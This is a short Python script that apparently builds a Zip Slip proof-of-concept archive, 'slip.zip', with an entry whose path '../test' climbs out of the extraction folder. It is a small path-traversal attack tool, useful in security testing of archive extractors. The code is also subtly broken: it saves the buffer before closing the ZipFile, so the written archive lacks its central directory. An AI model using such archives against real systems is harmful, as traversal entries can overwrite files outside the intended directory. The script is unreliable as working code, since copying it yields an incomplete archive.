import zipfile
import io

def zip_up():
    f = io.BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../test', 'test')
    zip = open('slip.zip', 'wb')
    zip.write(f.getvalue())
    zip.close()
    z.close()

zip_up()